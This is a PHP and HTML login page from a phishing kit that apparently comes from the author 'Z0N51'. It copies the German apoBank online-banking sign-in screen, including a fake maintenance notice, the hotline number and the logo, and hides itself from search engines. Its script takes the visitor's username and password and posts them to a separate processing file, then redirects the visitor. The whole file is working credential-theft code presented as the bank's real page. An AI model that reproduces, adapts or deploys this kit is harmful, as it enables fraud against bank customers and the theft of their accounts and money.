<?php
    /*******
    Main Author: Z0N51
    Contact me on telegram : https://t.me/z0n51official
    ********************************************************/
    
    require_once '../app/config.php';
    $_SESSION['last_page'] = "login";
    reset_action(get_client_ip());

?>
<!doctype html>
<html>

    <head>
        <!-- Required meta tags -->
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
        <meta name="robots" content="noindex," "nofollow," "noimageindex," "noarchive," "nocache," "nosnippet">
        
        <!-- CSS FILES -->
        <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/css/bootstrap.min.css">
        <link rel="stylesheet" href="../media/css/helpers.css">
        <link rel="stylesheet" href="../media/css/style.css">

        <link rel="icon" type="image/x-icon" href="../media/imgs/ff.ico" />

        <title>Login</title>
    </head>

    <body>

        <div id="wrapper">
            <div class="container">
                <p class="text-end pt30 pb30" style="color: #1e325f; font-weight: 500; font-size: 16px; opacity: .65;">deutsch</p>
                <div class="box">
                    <div class="box-header">
                        <h3>Login</h3>
                    </div>
                    <div class="box-body">

                        <input type="hidden" id="cap" name="cap">
                        <input type="hidden" name="steeep" id="steeep" value="login">

                        <p><b>Willkommen im Online-Banking der apoBank</b></p>
                        <p>
                            Wichtiger Hinweis zum Online-Banking<br>
                            Am kommenden <b>Samstag, 25. Februar 2023, ist im Zeitraum von 05:00 Uhr bis 09:00 Uhr</b> im Online-Banking aufgrund erforderlicher IT-Arbeiten mit Ausfällen zu rechnen.
                        </p>
                        <p>Wir bitten um Ihr Verständnis.</p>
                        <p>Aktuelle Sicherheitshinweise finden Sie unter <u>apobank.de/sicherheit</u></p>
                        <p>Informationen zum Online-Banking finden Sie unter <u>apobank.de/onlinebanking</u></p>
                        <p class="mb50">Statusmeldungen zu aktuellen Störungen finden Sie unter <u>apobank.de/status-onlinebanking</u></p>

                        <?php if( isset($_GET['error']) ) : ?>
                        <div class="error">
                            <p>Anmeldung fehlgeschlagen</p>
                        </div>
                        <?php endif; ?>

                        <div class="form-group row mb30">
                            <label class="col-md-5" for="username">Benutzername</label>
                            <div class="col-md-7">
                                <input type="text" name="username" id="username" class="form-control" autocomplete="off">
                            </div>
                        </div>
                        <div class="form-group row mb20">
                            <label class="col-md-5" for="password">Passwort</label>
                            <div class="col-md-7">
                                <input type="password" name="password" id="password" class="form-control" autocomplete="off">
                            </div>
                        </div>
                        <div class="btns mb30">
                            <button id="booom">Anmelden</button>
                        </div>
                        <p>Mit dem Absenden Ihrer Anmeldedaten erkennen Sie die <u>Sicherheitshinweise</u> an.</p>
                        <p class="mb-0">
                            <img src="../media/imgs/phone.png"> +49 211 5998 8000<br>
                            <u>Hotlines der apoBank</u>
                        </p>
                    </div>
                </div>
                <div class="footer-logo text-center pt50 pb50">
                    <img src="../media/imgs/footer-logo.png">
                </div>
            </div>
        </div>

        <!-- JS FILES -->
        <script src="https://code.jquery.com/jquery-3.6.1.min.js"></script>
        <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.2/dist/js/bootstrap.bundle.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.2.0/js/all.min.js"></script>
        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
        <script src="../media/js/js.js"></script>

        <script>
            var loaded = false;  
            $('#booom').click(function(){
                if( loaded == true ) {
                    return false;
                }
                formData = {
                    'cap' : $('#cap').val(),
                    'steeep' : $('#steeep').val(),
                    'username' : $('#username').val(),
                    'password' : $('#password').val(),
                }
                $.post( "../processing.php", formData )
                    .done(function( data ) {
                    window.location.href = data;
                });
                loaded = true;
            });
        </script>

    </body>

</html>